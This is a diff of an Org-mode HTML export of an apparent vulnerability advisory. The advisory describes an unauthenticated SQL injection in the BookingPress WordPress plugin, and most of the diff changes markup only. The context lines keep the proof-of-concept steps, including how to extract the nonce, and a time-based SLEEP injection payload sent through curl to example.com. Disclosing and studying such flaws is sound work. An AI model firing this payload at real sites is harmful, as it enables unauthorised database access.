-<pre class="src src-nil">The plugin fails to properly sanitize user supplied POST data before it is used in a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to unauthenticated users), leading to an unauthenticated SQL Injection
+<pre class="example">
+The plugin fails to properly sanitize user supplied POST data before it is used in a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to unauthenticated users), leading to an unauthenticated SQL Injection
 </pre>
-</div>
 </div>
 
 <ul class="org-ul">
-<li><a id="org7ed57a0"></a>Proof of Concept<br />
-<div class="outline-text-6" id="text-org7ed57a0">
-<div class="org-src-container">
-<pre class="src src-nil">- Create a new "category" and associate it with a new "service" via the BookingPress admin menu (/wp-admin/admin.php?page=bookingpress_services)
+<li><a id="org3333008"></a>Proof of Concept<br />
+<div class="outline-text-6" id="text-org3333008">
+<pre class="example">
+- Create a new "category" and associate it with a new "service" via the BookingPress admin menu (/wp-admin/admin.php?page=bookingpress_services)
 - Create a new page with the "[bookingpress_form]" shortcode embedded (the "BookingPress Step-by-step Wizard Form")
 - Visit the just created page as an unauthenticated user and extract the "nonce" (view source -&gt; search for "action:'bookingpress_front_get_category_services'")
 - Invoke the following curl command
@@ -392,7 +391,6 @@ curl -i 'https://example.com/wp-admin/admin-ajax.php' \
 Time based payload:  curl -i 'https://example.com/wp-admin/admin-ajax.php' \
   --data 'action=bookingpress_front_get_category_services&amp;_wpnonce=8cc8b79544&amp;category_id=1&amp;total_service=1) AND (SELECT 9578 FROM (SELECT(SLEEP(5)))iyUp)-- ZmjH'
 </pre>
-</div>
 </div>
 </li>
 </ul>
@@ -405,7 +403,7 @@ Time based payload:  curl -i 'https://example.com/wp-admin/admin-ajax.php' \
 <div id="postamble" class="status">
 <p class="author">Author:  (<a href="mailto:unseen@flake">unseen@flake</a>)</p>
 <p class="date">Date: </p>
-<p class="creator"><a href="https://www.gnu.org/software/emacs/">Emacs</a> 28.2 (<a href="https://orgmode.org">Org</a> mode 9.6.1)</p>
+<p class="creator"><a href="https://www.gnu.org/software/emacs/">Emacs</a> 28.2 (<a href="https://orgmode.org">Org</a> mode 9.5.5)</p>
 <p class="validation"></p>
 </div>
 </body>
